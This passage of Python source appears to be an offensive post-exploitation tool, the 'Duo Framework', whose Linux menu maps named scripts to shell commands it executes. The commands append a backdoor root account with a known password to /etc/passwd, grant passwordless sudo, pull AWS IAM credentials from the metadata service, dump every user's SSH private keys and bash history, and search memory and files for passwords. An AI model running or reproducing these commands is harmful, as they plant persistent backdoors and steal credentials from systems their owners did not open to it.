        {Fore.RED}linux/bash/exploit_docker_bash_container           {Fore.GREEN}Allows you to edit /etc/passwd as root, then add a backdoor account. [toor:password]
        {Fore.RED}linux/bash/exploit_writeable_sudoers               {Fore.GREEN}If you find a writable /etc/sudoers file, executing this command will allow you to use SUDO without password.
        {Fore.RED}linux/bash/find_suid                               {Fore.GREEN}Detects files with SUID bit set, starting from '/'. [Useful for privilege escalation]
        {Fore.RED}linux/bash/get_apache_site_enabled                 {Fore.GREEN}Read all apache 'site-enabled' directory files.
        {Fore.RED}linux/bash/get_aws_security_credentials            {Fore.GREEN}Useful if you are on a server with amazon cloud service running or exploiting SSRF.
        {Fore.RED}linux/bash/get_bash_history_for_all_user           {Fore.GREEN}Read bash history files for all users.
        {Fore.RED}linux/bash/get_last_edited_files                   {Fore.GREEN}Get files that were edited in the last 10 minutes.
        {Fore.RED}linux/bash/get_ssh_private_keys_for_all_users      {Fore.GREEN}Read all private ssh keys for all users.
        {Fore.RED}linux/bash/list_all_capabilities                   {Fore.GREEN}List all capabilities for all binaries. [Even ones outside bin folder]
        {Fore.RED}linux/bash/list_cronjobs_for_all_users             {Fore.GREEN}List all crob jobs for all users in the system. [Needs root]
        {Fore.RED}linux/bash/list_cronjobs_for_current_user          {Fore.GREEN}List all crob jobs for current user.
        {Fore.RED}linux/bash/list_systemd_timers                     {Fore.GREEN}List all timers for systemd using systemctl.
        {Fore.RED}linux/bash/search_for_password_in_memory           {Fore.GREEN}Search for 'password' string in memory.
        {Fore.RED}linux/bash/search_for_password_using_find          {Fore.GREEN}Search for 'password' string in file contents using find.
        {Fore.RED}linux/bash/search_for_password_using_grep          {Fore.GREEN}Search for 'password' string in file contents using grep.
        {Fore.RED}linux/bash/search_for_writeable_folders_files      {Fore.GREEN}Search a directory for writeable files and directories using find.
        ''')

def cmd_linux():
    print("Use the 'back' to go back to the main menu.")
    while True:
        linux_cmd_input = input(f"\n{Fore.RED}user@ter{Fore.GREEN}minal~$ ")
        if linux_cmd_input == "back": linux_fwk()
        os.system("{}".format(linux_cmd_input))

def linux_fwk():
    linux_help_fwk = \
        {
            "help": linux_help_and_stuff.main_menu_linux,
            "list": linux_help_and_stuff.main_menu_scripts_linux,
            "clear": help_and_other.clear,
            "banner": help_and_other.banner,
            "cmd": cmd_linux
        }
    linux_help_wrong = \
        {
            "hlpe": "echo [hlpe] is not a valid command, perhaps you meant [help]?",
            "hlep": "echo [hlep] is not a valid command, perhaps you meant [help]?",
            "hpel": "echo [hpel] is not a valid command, perhaps you meant [help]?",
            "lsit": "echo [lsit] is not a valid command, perhaps you meant [list]?",
            "ltis": "echo [ltis] is not a valid command, perhaps you meant [list]?",
            "ltsi": "echo [ltsi] is not a valid command, perhaps you meant [list]?",
            "lsti": "echo [lsti] is not a valid command, perhaps you meant [list]?",
            "lits": "echo [lits] is not a valid command, perhaps you meant [list]?",
            "clea": "echo [clea] is not a valid command, perhaps you meant [clear]?",
            "cealr": "echo [cealr] is not a valid command, perhaps you meant [clear]?",
            "claer": "echo [claer] is not a valid command, perhaps you meant [clear]?",
            "clwaer": "echo [clwaer] is not a valid command, perhaps you meant [clear]?",
            "celar": "echo [celar] is not a valid command, perhaps you meant [clear]?",
            "baner": "echo [baner] is not a valid command, perhaps you meant [banner]?",
            "bnaer": "echo [bnaer] is not a valid command, perhaps you meant [banner]?",
            "bnaere": "echo [bnaere] is not a valid command, perhaps you meant [banner]?",
            "bnnaer": "echo [bnnaer] is not a valid command, perhaps you meant [banner]?",
            "banenr": "echo [banenr] is not a valid command, perhaps you meant [banner]?",
            "cdm": "echo [cdm] is not a valid command, perhaps you meant [cmd]?"
        }
    linux_scripts_run = \
        {
            "use linux/bash/exploit_docker_bash_container": "cd / && echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> etc/passwd",
            "use linux/bash/exploit_writeable_sudoers": "cd / && echo 'USERNAME ALL=(ALL) NOPASSWD: ALL' >>/etc/sudoers",
            "use linux/bash/find_suid": "find / -perm 4000 2>/dev/null",
            "use linux/bash/get_apache_site_enabled": "cat /etc/apache2/site-enabled/*",
            "use linux/bash/get_aws_security_credentials": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "use linux/bash/get_bash_history_for_all_user": "cat /home/*/.bash_history",
            "use linux/bash/get_last_edited_files": "find / -mmin -10 2>/dev/null | grep -Ev '^/proc'",
            "use linux/bash/get_ssh_private_keys_for_all_users": "cat /home/*/.ssh/id_rsa",
            "use linux/bash/list_all_capabilities": "getcap -r / 2>/dev/null",
            "use linux/bash/list_cronjobs_for_all_users": "for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done",
            "use linux/bash/list_cronjobs_for_current_user": "crontab -l",
            "use linux/bash/list_systemd_timers": "systemctl list-timers --all",
            "use linux/bash/search_for_password_in_memory": "strings /dev/mem -n10 | grep -i PASS",
            "use linux/bash/search_for_password_using_grep": "grep --color=auto -rnw '/' -ie 'PASSWORD' --color=always 2> /dev/null",
            "use linux/bash/search_for_writeable_folders_files": "find / -perm -o+w"
        }
    while True:
        linux_shell = input(f"{Fore.RED}\nuser@{Fore.GREEN}duo~$ ")
        if linux_shell in linux_help_fwk:
            try:
                linux_help_fwk[linux_shell]()
            except:
                print("Command failed to execute properly!")
        elif linux_shell == "use linux/bash/search_for_password_using_find":
            subprocess.call('''find . -type f -exec grep -i -I 'PASSWORD' {{}} /dev/null \\;''', shell=True)
        elif linux_shell in linux_scripts_run:
            try:
                subprocess.call(linux_scripts_run[linux_shell], shell=True)
            except:
                print("Script failed to execute!")
        else:
            if linux_shell in linux_help_wrong:
                subprocess.call(linux_help_wrong[linux_shell], shell=True)
            else:
                print(f"Error! Command [{linux_shell}] was not found!")

def os_check():
    if os.name == "nt":
        loading_start()
        help_and_other.clear()
        print(help_and_other.banner)
        windows()
    else: 
        loading_start()
        help_and_other.clear()
        print(help_and_other.banner)
        linux_fwk()

def arg_check(mode):
    if mode == "-h" or mode == "--help":
        print(''' 
        -h, --help       Displays commands.
        -d, --duo        Launches the Duo Framework. [The Appropriate framework will be launched after an OS check.]
        -l, --linux      Launches Duo Framework for Linux.
        -w, --windows    Launches Duo Framework for Windows.
        -p, --payload    Launches the Payload Factory.
        ''')
    elif mode == "-p" or mode == "--payload": payload_factory()
    elif mode == "-d" or mode == "--duo": os_check()
    elif mode == "-w" or mode == "--windows":
        loading_start()
        help_and_other.clear()
        print(help_and_other.banner)
        windows()
    elif mode == "-l" or mode == "--linux":
        loading_start()
        help_and_other.clear()
        print(help_and_other.banner)
        linux_fwk()
    else: print("Usage: python duo.py -h")

def argsinput():
    if len(sys.argv) < 2:
        print("Usage: python duo.py -h")
        sys.exit()
    mode = sys.argv[1]
    arg_check(mode)
argsinput()
